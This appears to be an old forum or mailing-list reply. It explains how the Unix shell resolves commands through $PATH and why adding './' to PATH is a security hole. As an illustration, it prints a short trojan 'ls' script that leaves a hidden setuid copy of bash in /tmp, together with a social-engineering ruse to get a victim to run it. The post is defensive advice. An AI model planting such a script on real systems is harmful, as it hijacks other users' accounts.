"It's a feature", and it actually is :).

When you type a command on the command line the shell first looks to see
if there is a foward slash "/" in the command name.  If it finds one it
assumes that the command is the name of a file which it then tries to
execute.  Otherwise it looks in each of the directories in the $PATH
variable in order for the command, and executes the first one it finds.

So if you just type `a.out`, the shell looks through your $PATH for a file
called "a.out".  Apparently it dosn't exist there:) so it reports an
error.  When you type `./a.out` it is now assumes it is the name of a
file, and as it didn't start with a "/" or a "~", it treats it as a path
relative to the current directory.

So if you were to put "./" in your $PATH you would always be able to
execute any file in the current directory.  This however is a security
hole.  Take for instance the following senario:

J.R.L^Huser has prepended "./" to his $PATH.  W.E.Cyot^H^H^Hracker
wants to break into his account.  So W.E.C writes a short shell script

-----------------------------------------------
#!/bin/sh
cp /bin/bash /tmp/.JRL.shell # the one and only true shell :):):)
chmod 6111 /tmp/.JRL.shell # sets file permissions to --s--g--x
                          #                            ^!!!!! SETUID !!!!!
rm $0          # remove this script
/bin/ls $@     # executes ls and passes all the parameters passed to this
               # script to ls.
-----------------------------------------------
The then names it 'ls' and leaves it in a directory which has world
writable permissions.  He then leave the solution to J.R.L^HU's C
assignment (due tomorrow) in there by 'accident' and 'accidentally' tells
J.R.U about it.  When J.R.U goes into the directory, and does an `ls`
looking for the file, this script runs.

Now it looks like normal ls to J.R.U, but there is now a hidden shell in
/tmp which is SUID JRU.  ANYONE who executes this shell 'becomes' JRU
automatically.  ie WEC has just broken into JRU's account.

So it is normally a good thing to leave the current directory out of your
path.  If you are doing coding, and you really really really really don't
want to go to the horrific lengths of actually typing those two extra
characters :)&lt;g&gt; put the development directory in your path instead.

ie.  instead of export PATH="$PATH:./"
try export PATH="$PATH:$HOME/src/myprog"
